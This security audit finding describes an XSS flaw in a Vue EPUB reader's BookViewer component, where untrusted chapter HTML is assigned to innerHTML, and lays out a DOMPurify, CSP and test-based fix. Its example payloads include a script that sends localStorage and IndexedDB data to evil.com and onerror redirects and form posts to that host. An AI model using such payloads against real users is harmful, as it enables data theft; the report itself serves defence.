# Critical XSS Vulnerability via Unsafe innerHTML in BookViewer Component

## Severity
Critical

## Affected Files
- `src/components/BookViewer.vue:156`

## Description
The `BookViewer.vue` component directly assigns untrusted EPUB chapter content to `innerHTML` without any sanitization. This allows malicious EPUB files to inject arbitrary HTML and JavaScript into the application's DOM.

```vue
// Line 156 in BookViewer.vue
articleRef.value.innerHTML = content;
```

The `content` variable comes from EPUB chapter files loaded from untrusted sources (user-uploaded EPUB files). This content is never validated or sanitized before being inserted into the DOM.

## Potential Attack Vectors
1. **Script Injection**: Attacker crafts an EPUB with `<script>alert('XSS')</script>` in chapter content
2. **Event Handler Injection**: Attacker uses `<img src=x onerror=alert('XSS')>` 
3. **HTML Form Phishing**: Attacker injects `<form action="https://evil.com/steal" method="POST">` to capture user data
4. **Link Hijacking**: Attacker replaces internal links with malicious external links
5. **DOM-based XSS**: Attackers can exploit the unsafe DOM manipulation to execute arbitrary JavaScript

### Example Malicious EPUB Content
```html
<div>
  <p>Chapter content...</p>
  <script>
    // Steal cookies, local storage, or IndexedDB data
    fetch('https://evil.com/steal', {
      method: 'POST',
      body: JSON.stringify({
        localStorage: localStorage,
        indexedDB: await getAllIndexedDB()
      })
    });
  </script>
  <img src=x onerror="document.location='https://evil.com/phishing'">
</div>
```

## Implementation Plan

### Step 1: Install a DOMPurify sanitization library
```bash
npm install dompurify
npm install --save-dev @types/dompurify
```

### Step 2: Create a sanitization utility
Create `src/utils/sanitize.ts`:
```typescript
import DOMPurify from 'dompurify';

const EPUB_ALLOWED_TAGS = [
  'div', 'p', 'span', 'br', 'hr',
  'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
  'ul', 'ol', 'li', 'dl', 'dt', 'dd',
  'strong', 'b', 'em', 'i', 'u', 's', 'strike',
  'blockquote', 'q', 'cite',
  'a', 'img',
  'table', 'thead', 'tbody', 'tfoot', 'tr', 'th', 'td',
  'caption', 'col', 'colgroup',
  'pre', 'code', 'kbd', 'samp',
  'sub', 'sup',
  'figure', 'figcaption',
  'header', 'footer', 'nav', 'main', 'article', 'section', 'aside',
  'mark', 'small', 'abbr', 'bdo', 'ruby', 'rt', 'rp'
];

const EPUB_ALLOWED_ATTRIBUTES = [
  'href', 'src', 'alt', 'title', 'id', 'class', 'style',
  'lang', 'xml:lang', 'dir',
  'colspan', 'rowspan', 'headers', 'scope',
  'cite', 'datetime',
  'data-*'
];

const EPUB_ALLOWED_URI_PROTOCOLS = ['http', 'https', 'mailto', 'tel', '#'];

export function sanitizeEpubContent(dirty: string): string {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: EPUB_ALLOWED_TAGS,
    ALLOWED_ATTR: EPUB_ALLOWED_ATTRIBUTES,
    ALLOW_DATA_ATTR: true,
    FORBID_TAGS: ['script', 'style', 'iframe', 'object', 'embed', 'form', 'input', 'button'],
    FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover', 'onfocus', 'onblur', 'onsubmit'],
    ALLOWED_URI_REGEXP: new RegExp(`^(${EPUB_ALLOWED_URI_PROTOCOLS.join('|')}|blob:|data:image/)`),
    KEEP_CONTENT: true
  });
}
```

### Step 3: Update BookViewer.vue
```vue
<script setup lang="ts">
import { sanitizeEpubContent } from '@/utils/sanitize';

// ... existing code ...

function renderCurrentChapter() {
  if (!articleRef.value || !bookStore.currentBook) return;

  const chapter = bookStore.chapters[bookStore.currentChapter];
  if (!chapter) {
    articleRef.value.innerHTML = '<p class="text-center text-gray-500 dark:text-gray-400">No chapter content available.</p>';
    return;
  }

  let content = chapter.content || '<p class="text-center text-gray-500 dark:text-gray-400">Empty chapter.</p>';

  if (bookStore.searchHighlight && bookStore.searchHighlight.chapterIndex === bookStore.currentChapter) {
    content = highlightSearchText(content, bookStore.searchHighlight.searchText);
  }

  // SANITIZE BEFORE SETTING INNERHTML
  const sanitizedContent = sanitizeEpubContent(content);
  articleRef.value.innerHTML = sanitizedContent;

  // ... rest of the function ...
}
</script>
```

### Step 4: Update useEpub.ts to sanitize at the source
Modify `src/composables/useEpub.ts:437-445`:
```typescript
import { sanitizeEpubContent } from '@/utils/sanitize';

// ... in loadChapterContent function ...

let innerHTML = body.innerHTML;
if (!innerHTML || innerHTML.trim() === '') {
  console.warn(`Empty body in chapter: ${title} (${chapterPath})`);
  return `<p>Empty chapter: ${title}</p>`;
}

innerHTML = await processImages(innerHTML, archiveZip, baseUrl, chapterPath);

// SANITIZE BEFORE RETURNING
return sanitizeEpubContent(innerHTML);
```

### Step 5: Add Content Security Policy
Update `index.html`:
```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; 
               script-src 'self' 'unsafe-inline'; 
               style-src 'self' 'unsafe-inline'; 
               img-src 'self' blob: data: https:;
               connect-src 'self'; 
               font-src 'self' data:;
               object-src 'none';
               base-uri 'self';">
```

### Step 6: Add tests for sanitization
Create `tests/sanitize.test.ts`:
```typescript
import { describe, it, expect } from 'vitest';
import { sanitizeEpubContent } from '@/utils/sanitize';

describe('sanitizeEpubContent', () => {
  it('should remove script tags', () => {
    const dirty = '<div><script>alert("XSS")</script></div>';
    const clean = sanitizeEpubContent(dirty);
    expect(clean).not.toContain('<script>');
    expect(clean).not.toContain('alert');
  });

  it('should remove event handlers', () => {
    const dirty = '<img src=x onerror="alert(1)">';
    const clean = sanitizeEpubContent(dirty);
    expect(clean).not.toContain('onerror');
  });

  it('should preserve valid EPUB content', () => {
    const valid = '<p>Valid <strong>paragraph</strong> with <a href="#chapter">link</a>.</p>';
    const clean = sanitizeEpubContent(valid);
    expect(clean).toBe(valid);
  });

  it('should remove dangerous tags', () => {
    const dirty = '<iframe src="evil.com"></iframe><object data="evil.swf"></object>';
    const clean = sanitizeEpubContent(dirty);
    expect(clean).not.toContain('<iframe');
    expect(clean).not.toContain('<object');
  });
});
```

## Additional Recommendations
1. Consider implementing a sandboxed iframe for rendering EPUB content with stricter isolation
2. Implement file signature validation to verify uploaded files are actually EPUB files
3. Add rate limiting for file uploads
4. Implement content validation to ensure EPUB structure integrity
